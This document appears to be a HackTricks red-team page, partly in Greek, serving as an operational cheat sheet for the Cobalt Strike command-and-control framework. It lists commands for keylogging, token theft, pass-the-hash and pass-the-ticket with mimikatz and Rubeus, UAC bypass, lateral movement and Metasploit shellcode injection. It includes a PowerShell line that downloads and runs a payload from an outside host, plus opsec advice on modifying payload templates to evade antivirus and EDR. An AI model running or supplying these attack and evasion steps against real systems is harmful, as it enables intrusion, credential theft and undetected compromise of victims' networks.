# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Ακροατές

### Ακροατές C2

`Cobalt Strike -> Listeners -> Add/Edit` then you can select where to listen, which kind of beacon to use (http, dns, smb...) and more.

### Peer2Peer Ακροατές

The beacons of these listeners don't need to talk to the C2 directly, they can communicate to it through other beacons.

`Cobalt Strike -> Listeners -> Add/Edit` then you need to select the TCP or SMB beacons

* The **TCP beacon will set a listener in the port selected**. To connect to a TCP beacon use the command `connect <ip> <port>` from another beacon
* The **smb beacon will listen in a pipename with the selected name**. To connect to a SMB beacon you need to use the command `link [target] [pipe]`.

### Δημιουργία & Φιλοξενία payloads

#### Δημιουργία payloads σε αρχεία

`Attacks -> Packages ->`

* **`HTMLApplication`** for HTA files
* **`MS Office Macro`** for an office document with a macro
* **`Windows Executable`** for a .exe, .dll orr service .exe
* **`Windows Executable (S)`** for a **stageless** .exe, .dll or service .exe (better stageless than staged, less IoCs)

#### Δημιουργία & Φιλοξενία payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` This will generate a script/executable to download the beacon from cobalt strike in formats such as: bitsadmin, exe, powershell and python

#### Φιλοξενία payloads

If you already has the file you want to host in a web sever just go to `Attacks -> Web Drive-by -> Host File` and select the file to host and web server config.

### Επιλογές Beacon

<details>
<summary>Επιλογές Beacon και εντολές</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # This uses the highest supported powershell version (not oppsec)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Withuot /run, mimikatz spawn a cmd.exe, if you are running as a user with Desktop, he will see the shell (if you are running as SYSTEM you are good to go)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket in the attacker machine from a poweshell session & load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   wmi lateral movement with msbuild inline c# task (oppsec)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On metaploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Fenerate stageless Beacon shellcode, go to Attacks > Packages > Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### Custom implants / Linux Beacons

- Ένας custom agent χρειάζεται μόνο να μιλάει το Cobalt Strike Team Server HTTP/S protocol (default malleable C2 profile) για να κάνει register/check-in και να λαμβάνει tasks. Υλοποιήστε τα ίδια URIs/headers/metadata crypto που ορίζονται στο profile για να επαναχρησιμοποιήσετε το Cobalt Strike UI για tasking και output.
- Ένα Aggressor Script (π.χ., `CustomBeacon.cna`) μπορεί να τυλίξει τη δημιουργία payloads για το non-Windows beacon ώστε οι χειριστές να μπορούν να επιλέξουν τον listener και να παράγουν ELF payloads απευθείας από το GUI.
- Παραδείγματα Linux task handlers που εκθέτονται στο Team Server: `sleep`, `cd`, `pwd`, `shell` (exec arbitrary commands), `ls`, `upload`, `download`, και `exit`. Αυτά χαρτογραφούνται σε task IDs που αναμένει ο Team Server και πρέπει να υλοποιηθούν server-side ώστε να επιστρέφουν output στη σωστή μορφή.
- BOF support on Linux μπορεί να προστεθεί φορτώνοντας Beacon Object Files in-process με [TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader) (υποστηρίζει και Outflank-style BOFs), επιτρέποντας modular post-exploitation να τρέχει μέσα στο context/privileges του implant χωρίς να spawnάρει νέες διεργασίες.
- Ενσωματώστε έναν SOCKS handler στο custom beacon για να διατηρήσετε parity στο pivoting με τα Windows Beacons: όταν ο χειριστής τρέξει `socks <port>` το implant πρέπει να ανοίξει ένα τοπικό proxy για να δρομολογήσει τα εργαλεία του χειριστή μέσω του συμβιβασμένου Linux host προς τα εσωτερικά δίκτυα.

## Opsec

### Execute-Assembly

Το **`execute-assembly`** χρησιμοποιεί μια **sacrificial process** κάνοντας remote process injection για να εκτελέσει το υποδεικνυόμενο πρόγραμμα. Αυτό είναι πολύ noisy γιατί για να γίνει injection μέσα σε μια διεργασία χρησιμοποιούνται ορισμένα Win APIs που κάθε EDR ελέγχει. Ωστόσο, υπάρχουν κάποια custom εργαλεία που μπορούν να χρησιμοποιηθούν για να φορτώσουν κάτι στην ίδια διεργασία:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Στο Cobalt Strike μπορείτε επίσης να χρησιμοποιήσετε BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Το agressor script `https://github.com/outflanknl/HelpColor` θα δημιουργήσει την εντολή `helpx` στο Cobalt Strike η οποία θα βάλει χρώματα στις εντολές δείχνοντας αν είναι BOFs (green), αν είναι Frok&Run (yellow) και παρόμοια, ή αν είναι ProcessExecution, injection ή παρόμοια (red). Αυτό βοηθάει να ξέρετε ποιες εντολές είναι πιο stealthy.

### Act as the user

Μπορείτε να ελέγξετε events όπως `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Ελέγξτε όλα τα interactive logons για να μάθετε τις συνήθεις ώρες δραστηριότητας.
- System EID 12,13 - Ελέγξτε τη συχνότητα shutdown/startup/sleep.
- Security EID 4624/4625 - Ελέγξτε εισερχόμενες έγκυρες/άκυρες NTLM προσπάθειες.
- Security EID 4648 - Αυτό το event δημιουργείται όταν χρησιμοποιούνται plaintext credentials για logon. Αν το δημιούργησε μια διεργασία, το binary πιθανώς έχει τα credentials σε clear text σε κάποιο config file ή μέσα στον κώδικα.

Όταν χρησιμοποιείτε `jump` από cobalt strike, είναι προτιμότερο να χρησιμοποιήσετε τη μέθοδο `wmi_msbuild` ώστε η νέα διεργασία να φαίνεται πιο legit.

### Use computer accounts

Είναι σύνηθες οι defenders να ελέγχουν περίεργες συμπεριφορές που παράγονται από users και να **εξαιρούν service accounts και computer accounts όπως `*$` από το monitoring** τους. Μπορείτε να χρησιμοποιήσετε αυτούς τους λογαριασμούς για lateral movement ή privilege escalation.

### Use stageless payloads

Τα stageless payloads είναι λιγότερο noisy από τα staged επειδή δεν χρειάζεται να κατεβάσουν ένα δεύτερο στάδιο από τον C2 server. Αυτό σημαίνει ότι δεν παράγουν επιπλέον network traffic μετά την αρχική σύνδεση, καθιστώντας τα λιγότερο πιθανό να εντοπιστούν από network-based defenses.

### Tokens & Token Store

Προσοχή όταν κλέβετε ή δημιουργείτε tokens γιατί μπορεί ένα EDR να κάνει enumeration όλων των tokens όλων των threads και να βρει ένα **token που ανήκει σε διαφορετικό χρήστη** ή ακόμα και σε SYSTEM μέσα στη διεργασία.

Αυτό επιτρέπει να αποθηκεύετε tokens **ανά beacon** ώστε να μην χρειάζεται να κλέβετε το ίδιο token ξανά και ξανά. Αυτό είναι χρήσιμο για lateral movement ή όταν χρειάζεστε να χρησιμοποιήσετε ένα κλεμμένο token πολλές φορές:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Κατά τη lateral κίνηση, συνήθως είναι καλύτερο να **κλέψετε ένα token παρά να δημιουργήσετε νέο** ή να εκτελέσετε ένα pass the hash attack.

### Guardrails

Το Cobalt Strike έχει μια λειτουργία που ονομάζεται **Guardrails** που βοηθάει στο να αποτρέψει τη χρήση συγκεκριμένων εντολών ή ενεργειών που θα μπορούσαν να εντοπιστούν από τους defenders. Τα Guardrails μπορούν να ρυθμιστούν να μπλοκάρουν συγκεκριμένες εντολές, όπως `make_token`, `jump`, `remote-exec`, και άλλες που χρησιμοποιούνται συχνά για lateral movement ή privilege escalation.

Επιπλέον, το repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) περιέχει επίσης κάποιους ελέγχους και ιδέες που μπορείτε να εξετάσετε πριν εκτελέσετε ένα payload.

### Tickets encryption

Σε ένα AD να είστε προσεκτικοί με την κρυπτογράφηση των tickets. Από προεπιλογή, κάποια εργαλεία θα χρησιμοποιούν RC4 encryption για Kerberos tickets, το οποίο είναι λιγότερο ασφαλές από το AES encryption και σε up-to-date περιβάλλοντα by default χρησιμοποιείται AES. Αυτό μπορεί να εντοπιστεί από defenders που παρακολουθούν για αδύναμους αλγόριθμους κρυπτογράφησης.

### Avoid Defaults

Όταν χρησιμοποιείτε Cobalt Stricke by default οι SMB pipes θα έχουν το όνομα `msagent_####` και `"status_####`. Αλλάξτε αυτά τα ονόματα. Είναι δυνατόν να ελέγξετε τα ονόματα των υπαρχόντων pipes από Cobal Strike με την εντολή: `ls \\.\pipe\`

Επιπλέον, με SSH sessions δημιουργείται ένα pipe με όνομα `\\.\pipe\postex_ssh_####`. Αλλάξτε το με `set ssh_pipename "<new_name>";`.

Επίσης σε poext exploitation attack τα pipes `\\.\pipe\postex_####` μπορούν να τροποποιηθούν με `set pipename "<new_name>"`.

Στα Cobalt Strike profiles μπορείτε επίσης να τροποποιήσετε πράγματα όπως:

- Αποφυγή χρήσης `rwx`
- Πώς λειτουργεί η process injection behavior (ποια APIs θα χρησιμοποιηθούν) στο block `process-inject {...}`
- Πώς λειτουργεί το "fork and run" στο `post-ex {…}` block
- Το sleep time
- Το max size των binaries που θα φορτωθούν στη μνήμη
- Το memory footprint και το περιεχόμενο DLL με το `stage {...}` block
- Το network traffic

### Bypass memory scanning

Κάποια ERDs scanάρουν τη μνήμη για γνωστές malware signatures. Coblat Strike επιτρέπει να τροποποιήσετε τη συνάρτηση `sleep_mask` ως BOF που θα μπορεί να κρυπτογραφήσει στο memory το backdoor.

### Noisy proc injections

Όταν κάνετε injection κώδικα σε μια διεργασία αυτό συνήθως είναι πολύ noisy, αυτό συμβαίνει επειδή **καμία κανονική διεργασία συνήθως δεν εκτελεί αυτή τη δράση και επειδή οι τρόποι για να το κάνεις αυτό είναι πολύ περιορισμένοι**. Επομένως, μπορεί να εντοπιστεί από behaviour-based detection systems. Επιπλέον, μπορεί να ανιχνευτεί και από EDRs που σκανάρουν το δίκτυο για **threads που περιέχουν κώδικα που δεν υπάρχει σε δίσκο** (αν και διεργασίες όπως browsers με JIT το χρησιμοποιούν κοινά). Παράδειγμα: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Όταν spawnάρετε μια νέα διεργασία είναι σημαντικό να **διατηρήσετε μια κανονική parent-child** σχέση μεταξύ διεργασιών για να αποφύγετε τον εντοπισμό. Αν svchost.exec εκτελέσει iexplorer.exe θα φανεί suspicious, καθώς svchost.exe δεν είναι γονέας του iexplorer.exe σε ένα φυσιολογικό Windows περιβάλλον.

Όταν spawnάρεται ένα νέο beacon στο Cobalt Strike by default δημιουργείται μια διεργασία χρησιμοποιώντας **`rundll32.exe`** για να τρέξει τον νέο listener. Αυτό δεν είναι πολύ stealthy και μπορεί εύκολα να εντοπιστεί από EDRs. Επιπλέον, `rundll32.exe` τρέχει χωρίς args καθιστώντας το ακόμη πιο suspicious.

Με την ακόλουθη Cobalt Strike εντολή, μπορείτε να ορίσετε μια διαφορετική διεργασία για να spawnάρετε το νέο beacon, κάνοντάς το λιγότερο ανιχνεύσιμο:
```bash
spawnto x86 svchost.exe
```
Μπορείτε επίσης να αλλάξετε αυτή τη ρύθμιση **`spawnto_x86` and `spawnto_x64`** σε ένα προφίλ.

### Proxying attackers traffic

Οι επιτιθέμενοι μερικές φορές χρειάζεται να μπορούν να τρέξουν εργαλεία τοπικά, ακόμα και σε Linux μηχανές, και να κάνουν την κίνηση των θυμάτων να φτάσει στο εργαλείο (π.χ. NTLM relay).

Επιπλέον, μερικές φορές για να πραγματοποιήσει ένα pass-the.hash ή pass-the-ticket attack είναι πιο διακριτικό για τον επιτιθέμενο να **προσθέσει αυτό το hash ή ticket στη δική του διαδικασία LSASS** τοπικά και στη συνέχεια να pivot από αυτήν, αντί να τροποποιήσει μια διαδικασία LSASS σε μια μηχανή θύματος.

Ωστόσο, πρέπει να είστε **προσεκτικοί με την παραγόμενη κίνηση**, καθώς μπορεί να στέλνετε ασυνήθη κίνηση (kerberos?) από τη διαδικασία του backdoor σας. Για αυτό μπορείτε να pivot σε μια διαδικασία browser (αν και μπορεί να εντοπιστείτε αν κάνετε injecting σε μια διαδικασία, οπότε σκεφτείτε έναν stealth τρόπο για να το κάνετε).


### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Συνήθως στο `/opt/cobaltstrike/artifact-kit` μπορείτε να βρείτε τον κώδικα και τα προ-συμπιεσμένα templates (στο `/src-common`) των payloads που το cobalt strike θα χρησιμοποιήσει για να δημιουργήσει τα binary beacons.

Χρησιμοποιώντας [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με το generated backdoor (ή απλώς με το compiled template) μπορείτε να βρείτε τι προκαλεί το defender να ενεργοποιηθεί. Συνήθως είναι ένα string. Επομένως μπορείτε απλώς να τροποποιήσετε τον κώδικα που δημιουργεί το backdoor ώστε αυτή η string να μην εμφανίζεται στο τελικό binary.

Μετά την τροποποίηση του κώδικα τρέξτε απλά `./build.sh` από τον ίδιο κατάλογο και αντιγράψτε τον φάκελο `dist-pipe/` στον Windows client στο `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Μην ξεχάσετε να φορτώσετε το aggressive script `dist-pipe\artifact.cna` για να υποδείξετε στο Cobalt Strike να χρησιμοποιήσει τους πόρους από το δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.

#### Σετ Πόρων

Ο φάκελος ResourceKit περιέχει τα templates για τα script-based payloads του Cobalt Strike, συμπεριλαμβανομένων PowerShell, VBA και HTA.

Χρησιμοποιώντας το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) με τα templates μπορείτε να βρείτε τι δεν αρέσει στον defender (AMSI σε αυτή την περίπτωση) και να το τροποποιήσετε:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Τροποποιώντας τις ανιχνευμένες γραμμές, μπορεί κανείς να δημιουργήσει ένα πρότυπο που δεν θα εντοπίζεται.

Μην ξεχάσετε να φορτώσετε το aggressive script `ResourceKit\resources.cna` για να υποδείξετε στο Cobalt Strike να χρησιμοποιήσει τους πόρους από το δίσκο που θέλουμε και όχι αυτούς που έχουν φορτωθεί.

#### Function hooks | Syscall

Το function hooking είναι μια πολύ κοινή μέθοδος των ERDs για τον εντοπισμό κακόβουλης δραστηριότητας. Το Cobalt Strike σας επιτρέπει να παρακάμψετε αυτά τα hooks χρησιμοποιώντας **syscalls** αντί για τις standard Windows API κλήσεις με τη ρύθμιση **`None`**, ή να χρησιμοποιήσετε την έκδοση `Nt*` μιας συνάρτησης με τη ρύθμιση **`Direct`**, ή απλώς να πηδήξετε πάνω από τη συνάρτηση `Nt*` με την επιλογή **`Indirect`** στο malleable profile. Ανάλογα με το σύστημα, μια επιλογή μπορεί να είναι πιο stealth από την άλλη.

Αυτό μπορεί να οριστεί στο profile ή χρησιμοποιώντας την εντολή **`syscall-method`**

Ωστόσο, αυτό μπορεί επίσης να είναι θορυβώδες.

Μια επιλογή που παρέχει το Cobalt Strike για να παρακάμψει τα function hooks είναι να αφαιρέσει αυτά τα hooks με: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Μπορείτε επίσης να ελέγξετε ποιες συναρτήσεις είναι hooked με [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) ή [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>

## Αναφορές

- [Cobalt Strike Linux Beacon (custom implant PoC)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [Unit42 analysis of Cobalt Strike metadata encryption](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [SANS ISC diary on Cobalt Strike traffic](https://isc.sans.edu/diary/27968)
- [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)

{{#include ../banners/hacktricks-training.md}}
